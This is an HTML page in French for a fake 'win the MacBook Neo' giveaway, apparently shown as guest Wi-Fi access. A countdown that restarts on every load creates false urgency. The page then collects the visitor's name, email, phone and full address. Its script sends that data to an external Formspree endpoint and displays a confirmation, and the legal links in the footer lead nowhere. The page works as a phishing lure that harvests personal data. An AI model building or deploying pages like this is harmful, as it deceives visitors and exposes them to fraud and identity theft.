<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MacBook Neo</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: linear-gradient(135deg, #0ea5e9, #1e3a8a);
  color: white;
}

.container {
  padding: 20px;
  text-align: center;
}

.card {
  max-width: 420px;
  margin: auto;
  background: rgba(255,255,255,0.08);
  backdrop-filter: blur(25px);
  border-radius: 25px;
  padding: 25px;
  box-shadow: 0 20px 40px rgba(0,0,0,0.3);
}

img.main {
  width: 100%;
  border-radius: 20px;
  margin-bottom: 20px;
}

/* DATE */
.date {
  margin-top: 10px;
  font-size: 14px;
  color: #bae6fd;
}

/* TIMER */
.timer {
  margin-top: 10px;
  font-size: 20px;
  font-weight: bold;
  color: #facc15;
}

/* INPUT */
input {
  width: 100%;
  padding: 14px;
  margin: 10px 0;
  border-radius: 12px;
  border: none;
  font-size: 15px;
}

/* BOUTON */
.btn {
  background: linear-gradient(135deg, #06b6d4, #2563eb);
  border: none;
  padding: 15px;
  border-radius: 30px;
  color: white;
  font-weight: bold;
  width: 100%;
  margin-top: 20px;
}

/* CIVILITE STYLE iOS */
.civilite {
  display: flex;
  justify-content: center;
  gap: 30px;
  margin: 20px 0;
}

.switch {
  display: flex;
  align-items: center;
  gap: 10px;
}

.switch input {
  display: none;
}

.slider {
  width: 40px;
  height: 22px;
  background: #ccc;
  border-radius: 20px;
  position: relative;
}

.slider::before {
  content: "";
  width: 18px;
  height: 18px;
  background: white;
  border-radius: 50%;
  position: absolute;
  top: 2px;
  left: 2px;
  transition: 0.3s;
}

.switch input:checked + .slider {
  background: #22c55e;
}

.switch input:checked + .slider::before {
  transform: translateX(18px);
}

/* FOOTER */
footer {
  margin-top: 40px;
  padding: 20px;
  font-size: 13px;
  color: #dbeafe;
  text-align: center;
}

footer a {
  color: #e0f2fe;
  text-decoration: underline;
  margin: 0 5px;
}

.hidden {
  display: none;
}

.error {
  border: 2px solid red;
}
</style>

</head>

<body>

<div class="container">

<!-- PAGE 1 -->
<div id="step1" class="card">
  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
  <h1>Gagnez le MacBook Neo</h1>

  <div class="date">
    📅 Tirage le : <span id="dateTirage"></span>
  </div>

  <div class="timer" id="countdown"></div>

  <button class="btn" onclick="showForm()">Participer</button>
</div>

<!-- PAGE 2 -->
<div id="step2" class="card hidden">
  <img class="main" src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853">
  <h2>Inscription</h2>

  <form id="contestForm">

    <!-- CIVILITE -->
    <div class="civilite">
      <label class="switch">
        <input type="radio" name="civilite" value="Mr">
        <span class="slider"></span>
        Mr
      </label>

      <label class="switch">
        <input type="radio" name="civilite" value="Mme">
        <span class="slider"></span>
        Mme
      </label>
    </div>

    <input type="text" id="nom" placeholder="Nom">
    <input type="text" id="prenom" placeholder="Prénom">
    <input type="email" id="email" placeholder="Email">
    <input type="tel" id="telephone" placeholder="Téléphone">
    <input type="text" id="adresse" placeholder="Adresse (rue)">
    <input type="text" id="cp" placeholder="Code postal">
    <input type="text" id="ville" placeholder="Ville">

    <button class="btn">Valider</button>
  </form>
</div>

<!-- PAGE 3 -->
<div id="step3" class="card hidden">
  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
  <h2>🎉 Bravo !</h2>
  <p>Votre participation a bien été enregistrée.</p>
  <p>Les résultats vous seront communiqués prochainement.</p>
</div>

</div>

<!-- FOOTER -->
<footer>
  © 2026 – Accès Wi-Fi invité. Tous droits réservés •<br>
  <a href="#">Politique de confidentialité</a> •
  <a href="#">Conditions générales</a> •
  <a href="#">Mentions légales</a>
</footer>

<script>

/* DATE + TIMER */
const targetDate = new Date();
targetDate.setHours(targetDate.getHours() + 2);

document.getElementById("dateTirage").textContent =
  targetDate.toLocaleDateString("fr-FR");

function updateCountdown() {
  const now = new Date();
  const diff = targetDate - now;

  if (diff <= 0) {
    document.getElementById("countdown").innerHTML = "⏳ Terminé";
    return;
  }

  const h = Math.floor(diff / 3600000);
  const m = Math.floor((diff % 3600000) / 60000);
  const s = Math.floor((diff % 60000) / 1000);

  document.getElementById("countdown").innerHTML =
    `⏳ Fin dans : ${h}h ${m}m ${s}s`;
}

setInterval(updateCountdown, 1000);

/* NAVIGATION */
function showForm() {
  document.getElementById("step1").classList.add("hidden");
  document.getElementById("step2").classList.remove("hidden");
}

/* FORM */
document.getElementById("contestForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const civilite = document.querySelector('input[name="civilite"]:checked');
  const nom = document.getElementById("nom");
  const prenom = document.getElementById("prenom");
  const email = document.getElementById("email");
  const telephone = document.getElementById("telephone");
  const adresse = document.getElementById("adresse");
  const cp = document.getElementById("cp");
  const ville = document.getElementById("ville");

  if (!civilite) {
    alert("Veuillez sélectionner Mr ou Mme");
    return;
  }

  fetch("https://formspree.io/f/xnjozjby", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      civilite: civilite.value,
      nom: nom.value,
      prenom: prenom.value,
      email: email.value,
      telephone: telephone.value,
      adresse: adresse.value,
      code_postal: cp.value,
      ville: ville.value
    })
  });

  document.getElementById("step2").classList.add("hidden");
  document.getElementById("step3").classList.remove("hidden");
});
</script>

</body>
</html>
